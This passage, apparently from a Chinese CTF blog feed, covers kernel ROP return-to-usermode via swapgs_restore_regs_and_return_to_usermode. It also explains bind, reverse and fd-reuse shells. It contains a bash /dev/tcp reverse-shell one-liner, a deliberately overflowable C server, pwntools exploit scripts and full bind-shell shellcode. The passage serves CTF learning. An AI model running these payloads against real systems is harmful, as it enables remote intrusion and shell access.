class="code"><pre><span class="line">cat /proc/kallsyms| grep swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">arch/x86/entry/entry_64.S</span><br><span class="line"></span><br><span class="line"><span class="title function_">SYM_INNER_LABEL</span><span class="params">(swapgs_restore_regs_and_return_to_usermode, SYM_L_GLOBAL)</span></span><br><span class="line"></span><br><span class="line">    POP_REGS pop_rdi=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.</span></span><br><span class="line"><span class="comment">     * Save old stack pointer and switch to trampoline stack.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    movq    %rsp, %rdi</span><br><span class="line">    movq    <span class="title function_">PER_CPU_VAR</span><span class="params">(cpu_tss_rw + TSS_sp0)</span>, %rsp</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Copy the IRET frame to the trampoline stack. */</span></span><br><span class="line">    pushq    6*8<span class="params">(%rdi)</span>    <span class="comment">/* SS */</span></span><br><span class="line">    pushq    5*8<span class="params">(%rdi)</span>    <span class="comment">/* RSP */</span></span><br><span class="line">    pushq    4*8<span class="params">(%rdi)</span>    <span class="comment">/* EFLAGS */</span></span><br><span class="line">    pushq    3*8<span class="params">(%rdi)</span>    <span class="comment">/* CS */</span></span><br><span class="line">    pushq    2*8<span class="params">(%rdi)</span>    <span class="comment">/* RIP */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Push user RDI on the trampoline stack. */</span></span><br><span class="line">    <span class="title function_">pushq</span>    <span class="params">(%rdi)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We are on the trampoline stack.  All regs except RDI are live.</span></span><br><span class="line"><span class="comment">     * We can do future final exit work right here.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">    SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Restore RDI. */</span></span><br><span class="line">    popq    %rdi</span><br><span class="line">    SWAPGS</span><br><span class="line">    INTERRUPT_RETURN</span><br></pre></td></tr></table></figure><p>纯汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600A34 41 5F                          pop     r15</span><br><span class="line">.text:FFFFFFFF81600A36 41 5E                          pop     r14</span><br><span class="line">.text:FFFFFFFF81600A38 41 5D                          pop     r13</span><br><span class="line">.text:FFFFFFFF81600A3A 41 5C                          pop     r12</span><br><span class="line">.text:FFFFFFFF81600A3C 5D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF81600A3D 5B                             pop     rbx</span><br><span class="line">.text:FFFFFFFF81600A3E 41 5B                          pop     r11</span><br><span class="line">.text:FFFFFFFF81600A40 41 5A                          pop     r10</span><br><span class="line">.text:FFFFFFFF81600A42 41 59                          pop     r9</span><br><span class="line">.text:FFFFFFFF81600A44 41 58                          pop     r8</span><br><span class="line">.text:FFFFFFFF81600A46 58                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600A47 59                             pop     rcx</span><br><span class="line">.text:FFFFFFFF81600A48 5A                             pop     rdx</span><br><span class="line">.text:FFFFFFFF81600A49 5E                             pop     rsi</span><br><span class="line">.text:FFFFFFFF81600A4A 48 89 E7                       mov     rdi, rsp    &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class="line">.text:FFFFFFFF81600A4D 65 48 8B 24 25+                mov     rsp, gs: 0x5004</span><br><span class="line">.text:FFFFFFFF81600A56 FF 77 30                       push    qword ptr [rdi+30h]</span><br><span class="line">.text:FFFFFFFF81600A59 FF 77 28                       push    qword ptr [rdi+28h]</span><br><span class="line">.text:FFFFFFFF81600A5C FF 77 20                       push    qword ptr [rdi+20h]</span><br><span class="line">.text:FFFFFFFF81600A5F FF 77 18                       push    qword ptr [rdi+18h]</span><br><span class="line">.text:FFFFFFFF81600A62 FF 77 10                       push    qword ptr [rdi+10h]</span><br><span class="line">.text:FFFFFFFF81600A65 FF 37                          push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81600A67 50                             push    rax</span><br><span class="line">.text:FFFFFFFF81600A68 EB 43                          nop</span><br><span class="line">.text:FFFFFFFF81600A6A 0F 20 DF                       mov     rdi, cr3</span><br><span class="line">.text:FFFFFFFF81600A6D EB 34                          jmp     0xFFFFFFFF81600AA3</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600AA3 48 81 CF 00 10+                or      rdi, 1000h</span><br><span class="line">.text:FFFFFFFF81600AAA 0F 22 DF                       mov     cr3, rdi</span><br><span class="line">.text:FFFFFFFF81600AAD 58                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600AAE 5F                             pop     rdi</span><br><span class="line">.text:FFFFFFFF81600AAF FF 15 23 65 62+                call    cs: SWAPGS</span><br><span class="line">.text:FFFFFFFF81600AB5 FF 25 15 65 62+                jmp     cs: INTERRUPT_RETURN</span><br><span class="line"></span><br><span class="line">_SWAPGS</span><br><span class="line">.text:FFFFFFFF8103EFC0 55                             push    rbp</span><br><span class="line">.text:FFFFFFFF8103EFC1 48 89 E5                       mov     rbp, rsp</span><br><span class="line">.text:FFFFFFFF8103EFC4 0F 01 F8                       swapgs</span><br><span class="line">.text:FFFFFFFF8103EFC7 5D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF8103EFC8 C3                             retn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_INTERRUPT_RETURN</span><br><span class="line">.text:FFFFFFFF81600AE0 F6 44 24 20 04                 test    byte ptr [rsp+0x20], 4</span><br><span class="line">.text:FFFFFFFF81600AE5 75 02                          jnz     native_irq_return_ldt</span><br><span class="line">.text:FFFFFFFF81600AE7 48 CF                          iretq</span><br></pre></td></tr></table></figure><p>ROP时,程序流程控制到 mov rdi, rsp 指令时，栈布局如下就行：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rsp  ----&gt;  0</span><br><span class="line">            0</span><br><span class="line">            rip</span><br><span class="line">            cs</span><br><span class="line">            rflags</span><br><span class="line">            rsp</span><br><span class="line">            ss</span><br></pre></td></tr></table></figure><p>然后貌似不能够直接从mov rdi,cr3处开始(还没确认)</p><p>此外改modprobe_path也是一个不错的方法，返回后当前进程Segmentation fault也不影响提权</p>]]></content>
    
    
    <summary type="html">kernel好难,先做个十几二十题熟悉熟悉 (摆了,只做了不到十题_orz)</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="kernel" scheme="https://ixout.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>关于流与正反连shell</title>
    <link href="https://ixout.github.io/posts/49884/"/>
    <id>https://ixout.github.io/posts/49884/</id>
    <published>2024-03-11T14:00:04.000Z</published>
    <updated>2024-04-06T05:24:17.947Z</updated>
    
    <content type="html"><![CDATA[<p>这几天做了2022鹏城杯的ezthree这道题</p><p>接触到了一些之前没有深入去想过的东西,这里记录一下</p><h1 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h1><p>这道题关闭了0,1,2这三个文件描述符,从而使得无法输入输出</p><p>但如果没有chroot,我们完全可以重新打开<code>/dev/pts/ptmx</code>获得一个新的终端并与之交互</p><p>(这里其实不太确定是不是要打开<code>/dev/pts/n</code>,但其实应该不是,毕竟这玩意有权限访问限制)</p><h1 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h1><p>关于标准流重定向</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span> &gt; file  <span class="comment">#将标准输出1重定向到 file 里</span></span><br><span class="line"><span class="built_in">command</span> 1&gt; file <span class="comment">#将标准输出1重定向到 file 里，与上面的写法功能一样</span></span><br><span class="line"><span class="built_in">command</span> 2&gt; file <span class="comment">#将标准错误输出1重定向到 file 里</span></span><br><span class="line"><span class="built_in">command</span> &amp;&gt; file <span class="comment">#将标准输出1 与 标准错误输出2 一起重定向到 file 里</span></span><br></pre></td></tr></table></figure><p><code>&gt;&amp;</code>可以用于互相重定向</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>利用这点,如果程序运行的是bash,那么还有一种利用<code>/dev/tcp</code>获得shell的方式</p><p>我们只需要在攻击端上监听一个端口(本质上就是建立一个tcp服务器等待连接)</p><p><code>nc -lvnp 6678</code></p><p>利用bash创建socket的特性,然后再在被攻击端执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line">bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;2</span><br><span class="line"><span class="comment"># 如果使用system执行以上命令的话，需要改成如下形式</span></span><br><span class="line">bash -c <span class="string">&quot;bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span></span><br><span class="line">bash -c <span class="string">&quot;bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;2&quot;</span></span><br></pre></td></tr></table></figure><p><code>bash -i</code> ：创建一个交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&gt;` ：将stdout和stderr都重定向到stdout。`&gt;&amp;`跟它的功能一样，当使用`&gt;&amp; file`或`&amp;&gt; file`时，等同于`&gt; file 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p><code>/dev/tcp/ip/port</code> ：利用bash的特性，创建一个socket连接</p><p><code>0&gt;&amp;1</code> ：将stdin重定向给stdout</p><p><code>0&gt;&amp;2</code> ：将stdin重定向给stderr</p><p><code>bash -c &quot;command&quot;</code> ：创建一个子shell环境运行command</p><p>现在攻击端就获得了一个shell</p><h1 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h1><p>参考<a href="https://blingblingxuanxuan.github.io/2021/03/21/reverse-tcp/#findpeersh">深入理解 pwn 题中的正连/反连 tcp | blingbling’s blog (blingblingxuanxuan.github.io)</a></p><p>直接用佬的代码了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="type">int</span> jmp = <span class="number">0xe4ff</span>;</span><br><span class="line">    <span class="type">int</span> sckfd,fd;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></span><br><span class="line">    sckfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line">    server.sin_family = AF_INET;</span><br><span class="line">    server.sin_port = htons(<span class="number">8888</span>);</span><br><span class="line">    server.sin_addr.s_addr = inet_addr(<span class="string">&quot;0.0.0.0&quot;</span>);</span><br><span class="line">    bind(sckfd,(<span class="keyword">struct</span> sockaddr *)&amp;server,<span class="keyword">sizeof</span>(server));</span><br><span class="line">    listen(sckfd,<span class="number">10</span>);</span><br><span class="line">    fd = accept(sckfd,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    read(fd,buf,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="sh"><a href="#sh" class="headerlink" title="sh()"></a>sh()</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pr = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">30</span></span><br><span class="line">payload += p64(<span class="number">0x40120c</span>)</span><br><span class="line">payload += asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">pr.sendline(payload)</span><br><span class="line">pr.interactive()</span><br></pre></td></tr></table></figure><p>运行可以发现,进程的确会启动一个shell</p><p>但是这个shell的三个标准流都是绑定到对应的伪终端的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> aichch  /proc/36968/fd  file 0</span><br><span class="line">0: symbolic <span class="built_in">link</span> to /dev/pts/0</span><br><span class="line"> aichch  /proc/36968/fd  file 1</span><br><span class="line">1: symbolic <span class="built_in">link</span> to /dev/pts/0</span><br><span class="line"> aichch  /proc/36968/fd  file 2</span><br><span class="line">2: symbolic <span class="built_in">link</span> to /dev/pts/0</span><br><span class="line"> aichch  /proc/36968/fd </span><br></pre></td></tr></table></figure><p>而我们与之建立连接的是一个socket</p><p>那显然我们是无法与shell进行交互的,除非将0,1,2都重定向到socket</p><p>到这里再研究一下,平常我们做pwn题的时候为什么可以直接与拿到的shell进行交互</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lrwx------ 1 ctf ctf 64 Mar 13 13:52 0 -&gt; <span class="string">&#x27;socket:[14638737]&#x27;</span></span><br><span class="line">lrwx------ 1 ctf ctf 64 Mar 13 13:52 1 -&gt; <span class="string">&#x27;socket:[14638737]&#x27;</span></span><br><span class="line">lrwx------ 1 ctf ctf 64 Mar 13 13:52 2 -&gt; <span class="string">&#x27;socket:[14638737]&#x27;</span></span><br></pre></td></tr></table></figure><p>这是一个docker中由ctf_xinted启动的进程</p><p>可以看到0,1,2都被链接到一个socket,而非本地的终端</p><p>因此最后我们可以与之交互</p><p>至于pwntools启动的进程,012则是一个pipe管道</p><p>真正直接启动的进程才是终端</p><h2 id="bindsh-正连"><a href="#bindsh-正连" class="headerlink" title="bindsh() - 正连"></a>bindsh() - 正连</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pr = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">30</span></span><br><span class="line">payload += p64(<span class="number">0x40120c</span>)</span><br><span class="line">payload += asm(shellcraft.bindsh(<span class="number">4444</span>,<span class="string">&#x27;ipv4&#x27;</span>)) </span><br><span class="line"></span><br><span class="line">pr.sendline(payload)</span><br><span class="line"></span><br><span class="line">ff = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">4444</span>)   </span><br><span class="line">ff.interactive()</span><br></pre></td></tr></table></figure><p>这个方法是在server1中通过socket()–&gt;bind()–&gt;listen()–&gt;accept()创建一个新的socket监听端口，然后把server1的fd中 0 1 2全部指向新socket。这样接下来执行execve()后，输入输出就全定向到新socket流中。攻击进程主动向受害者进程的4444端口发起连接，就可以拿到受害者的输入输出，从而获得shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">.section .shellcode,&quot;awx&quot;</span><br><span class="line">.global _start</span><br><span class="line">.global __start</span><br><span class="line">.p2align 2</span><br><span class="line">_start:</span><br><span class="line">__start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    /* call socket(&#x27;AF_INET&#x27;, &#x27;SOCK_STREAM&#x27;, 0) */</span><br><span class="line">    push 41 /* 0x29 */</span><br><span class="line">    pop rax</span><br><span class="line">    push 2 /* 2 */</span><br><span class="line">    pop rdi</span><br><span class="line">    push 1 /* 1 */</span><br><span class="line">    pop rsi</span><br><span class="line">    cdq /* rdx=0 */</span><br><span class="line">    syscall</span><br><span class="line">    /* Build sockaddr_in structure */</span><br><span class="line">    push rdx</span><br><span class="line">    mov edx, 0x1010101 /* (AF_INET | (23569 &lt;&lt; 16)) == 0x5c110002 */</span><br><span class="line">    xor edx, 0x5d100103</span><br><span class="line">    push rdx</span><br><span class="line">    /* rdx = sizeof(struct sockaddr_in6) */</span><br><span class="line">    push 0x10</span><br><span class="line">    pop rdx</span><br><span class="line">    /* Save server socket in rbp */</span><br><span class="line">    mov rbp, rax</span><br><span class="line">    /* call bind(&#x27;rax&#x27;, &#x27;rsp&#x27;, &#x27;rdx&#x27;) */</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    push 49 /* 0x31 */</span><br><span class="line">    pop rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    syscall</span><br><span class="line">    /* call listen(&#x27;rbp&#x27;, 1) */</span><br><span class="line">    push 50 /* 0x32 */</span><br><span class="line">    pop rax</span><br><span class="line">    mov rdi, rbp</span><br><span class="line">    push 1</span><br><span class="line">    pop rsi</span><br><span class="line">    syscall</span><br><span class="line">    /* call accept(&#x27;rbp&#x27;, 0, 0) */</span><br><span class="line">    push 43 /* 0x2b */</span><br><span class="line">    pop rax</span><br><span class="line">    mov rdi, rbp</span><br><span class="line">    xor esi, esi /* 0 */</span><br><span class="line">    cdq /* rdx=0 */</span><br><span class="line">    syscall</span><br><span class="line">    /* dup() file descriptor rax into stdin/stdout/stderr */</span><br><span class="line">dup_4:</span><br><span class="line">    mov rbp, rax</span><br><span class="line">    push 3</span><br><span class="line">loop_5:</span><br><span class="line">    pop rsi</span><br><span class="line">    dec rsi</span><br><span class="line">    js after_6</span><br><span class="line">    push rsi</span><br><span class="line">    /* call dup2(&#x27;rbp&#x27;, &#x27;rsi&#x27;) */</span><br><span class="line">    push 33 /* 0x21 */</span><br><span class="line">    pop rax</span><br><span class="line">    mov rdi, rbp</span><br><span class="line">    syscall</span><br><span class="line">    jmp loop_5</span><br><span class="line">after_6:</span><br><span class="line">    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">    /* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">    push 0x68</span><br><span class="line">    mov rax, 0x732f2f2f6e69622f</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">    /* push b&#x27;sh\x00&#x27; */</span><br><span class="line">    push 0x1010101 ^ 0x6873</span><br><span class="line">    xor dword ptr [rsp], 0x1010101</span><br><span class="line">    xor esi, esi /* 0 */</span><br><span class="line">    push rsi /* null terminate */</span><br><span class="line">    push 8</span><br><span class="line">    pop rsi</span><br><span class="line">    add rsi, rsp</span><br><span class="line">    push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx /* 0 */</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push 59 /* 0x3b */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><p>这里用到了一个<code>dup2</code>系统调用,其用于<strong>重定向文件描述符</strong>：通过 <code>dup2(oldfd, newfd)</code>，可以将文件描述符 <code>oldfd</code> 复制到文件描述符 <code>newfd</code> 上,如果 <code>newfd</code> 已经打开了一个文件，<code>dup2</code> 会先关闭 <code>newfd</code> 所指向的文件，然后将 <code>oldfd</code> 复制到 <code>newfd</code> 上。</p><p>举个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;output.txt&quot;</span>, O_WRONLY | O_CREAT | O_TRUNC, <span class="number">0644</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dup2(fd, STDOUT_FILENO) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;dup2&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This will be written to output.txt\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序将标准输出重定向到了一个名为 <code>output.txt</code> 的文件中，因此 <code>printf</code> 输出的内容会被写入到 <code>output.txt</code> 文件中，而不是显示在终端上</p><h2 id="dupsh"><a href="#dupsh" class="headerlink" title="dupsh()"></a>dupsh()</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pr = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">30</span></span><br><span class="line">payload += p64(<span class="number">0x40120c</span>)</span><br><span class="line">payload += asm(shellcraft.dupsh(<span class="number">4</span>)) </span><br><span class="line"></span><br><span class="line">pr.sendline(payload)</span><br><span class="line"></span><br><span class="line">pr.interactive()</span><br></pre></td></tr></table></figure><p>和上一个差不多,只不过复用了连接的fd,只对于这个例子来说,一般做题显然不会自带有这个fd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">.section 